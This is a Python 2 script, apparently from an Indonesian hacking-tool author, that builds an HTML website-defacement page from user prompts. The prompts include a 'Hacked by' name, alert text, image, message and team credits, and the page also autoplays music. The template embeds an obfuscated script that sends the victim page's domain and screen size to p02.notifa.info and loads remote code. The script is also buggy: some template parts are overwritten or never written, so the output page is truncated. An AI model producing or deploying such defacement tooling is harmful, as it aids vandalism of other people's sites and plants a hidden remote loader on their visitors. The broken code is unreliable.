#!/usr/bin/python
import os
import time

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

head = E+H+"""
      ___           ___     
     /\__\         /\__\  ___  ____ ____ ____ ____ ____
    /:/ _/_       /:/  /  |  \ |___ |___ |__| |    |___ 
   /:/ /\  \     /:/  /   |__/ |___ |    |  | |___ |___
  /:/ /::\  \   /:/  /  ___          """+B+'Version 1.0'+H+"""
 /:/_/:/\:\__\ /:/__/  /\__\   __| _ \ __|   \__ __|_ \ _ \ 
 \:\/:/ /:/  / \:\  \ /:/  /  (      / _|   _ \  | (   |  / 
  \::/ /:/  /   \:\  /:/  /  \___|_|_\___|_/  _\_|\___/_|_\
   \/_/:/  /     \:\/:/  /  """+G+'AUTHOR : SADEWA DEWA'+H+"""
     /:/  /       \::/  /  """+E+'YOUTUBE : MR WH5'+O+"""
     \/__/         \/__/  """+U+'FACEBOOK : SADEWA DEWA'+H+"""
	"""+E

print head
print (U+'Isi Data Dibawah'+E)
title = raw_input("{1} Judul title: ")
pesnot = raw_input("{2} Pesan Notifikasi: ")
heading = raw_input("{3} Hacked by: ")
imagelink = raw_input("{4} link gambar (tengah): ")
message = raw_input("{5} Pesan. gunakan kode <br> untuk paragraf baru : ")
thankto = raw_input("{6} Thanks To: ")
team = raw_input("{7} Team: ")
youtubeid = raw_input("{8} youtube kode (MUSIK): ")

fo = open("scriptv2.html","w")

m1 = """<html>
<head>
<title>"""

m2 = title

m3 = """</title>
<meta charset="UTF-8">
<link href="http://fonts.googleapis.com/css?family=Rancho" rel="stylesheet" type="text/css">
<center>     
<style>
body {
    background-image:url("https://i0.wp.com/blog.smartthings.com/wp-content/uploads/2014/03/tumblr_n1fqbfMefH1smapx8o1_500.gif"); 
    background-repeat: no-repeat; 
    background-size: 100% 100%; 
}
.radio_player {
	 width:500px;
	 float:center;
}
</style>
</head>
<script>    alert('"""

m4 = pesnot

m5 = """')   </script>   
</br>
</br>
</br>
</br>
<div align="center">
<p>&nbsp;<img src='"""

m6 = imagelink 

m7 = """' border="0" width="200" 
height="200"></div>
<font color="ffffff" size="20px" face="Rancho"><a href ="https://techskuy.xyz" style="color: white;">Hacked</a> By<font color="#ff0000"> """

m8 = heading

m9 = """</span><br><br><font face="Rancho" color="aqua" size="5px"> """

m10 = message

m11 = """</span>
<center>
<marquee behavior="alternate" scrollamount="50" width="320"> <font size="4" 
color="red">________________<font size="4" 

color="yellow">________________<font size="4" 

color="#1CFF00">________________<font size="4" 

color="#00A7FF">________________</font></font></font></font></marquee>

<center>
<font face="verdana" size="3" color="black"></font><marquee behavior="alternate" scrollamount="13" width="650"><font face="verdana" size="3" color="gold">"""

m12 = team 

m13 = """</font>
<font face="verdana" size="3" color="white">"""

m14 = thankto 

m15 = """<font face="verdana" size="3" color="gold">#</font></font></marquee>
</center><br>

<div class="redline"></div>
<div class="wraper">
	<div class="header">
        <div class="subsriber_div">
            <div class="container">
            	<div class="radio_player">
<script type="text/javascript" src="http://hosted.musesradioplayer.com/mrp.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXIkB%2fd7T%2fXIxYSbrA1QBfpLlW1KMdAvQ9DgMrNkIMlkP1fKbo5mS%2b95AvmLBYy3IZiUiKdCwWftLIYGhvOFfWIDwPRnzSZ5BW9ivU9uymV0sIOWZBYQexo7YvWx%2fu9vlgGcV41mL3RkDnvY1uQqGz0s3HbeiuZ1UXzz9BO2zmO1alSvoDiBJc8fbcKWvgJI4yY5dyxhEooBEDRXbbaceVkmOlC1Oi6%2bSTO5lsGePzjf6bYNKNIbhzWrH7Ie9NuaNtbI7iOY6aw0wEspeoVwmGLNF%2bm8II4Hmb%2bozh0leX58eTD%2brLZHolN8TnapWhxfvF%2fEsSzojk2DriBVWC9%2fA%2bgN3sZqo99kMX1ZruVxYxxnvNoWdQWgKJJ1nHDhKydNeCcW%2bp3hHUUM8e7P3%2fInI1TFLFzagVABUlZ9qEZwq1lBb8iiTWoGbJWN%2f3%2fmy5mbm%2fyAYX9TpKmyoScNubwwsMjmk%2f1HbIwZKO09FblEKewzL04uzyzFhzkB5x6fyewbDx21xetQLGPKKbvnRf9Cak6tuIEP9402jlpM%2fUs8besR3wg%2bTATZHP%2fPM0fyyVpG7uM8LlY8DrIqsKadtV2FD%2bxg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><iframe width="0" height="0" src="http://www.youtube.com/v/"""

m15 = youtubeid

m16 = """&autoplay=1" frameborder="0"></iframe></body></html>"""


fo.write(m1)
fo.write(m2)
fo.write(m3)
fo.write(m4)
fo.write(m5)
fo.write(m6)
fo.write(m7)
fo.write(m8)
fo.write(m9)
fo.write(m10)
fo.write(m11)
fo.write(m12)
fo.write(m13)

print (H+'Script Berhasil Di buat!'+E)
print (H+'Lihat filenya di /sdcard/HasilScriptDefaceCreator/scriptv2.html'+E)

time.sleep(3)
fo.close()
os.system('clear')
os.system('mkdir /sdcard/HasilScriptDefaceCreator')
os.system('mv scriptv2.html /sdcard/HasilScriptDefaceCreator/')
os.system('python CreateSC.py')
os.system('python CreateSC.py')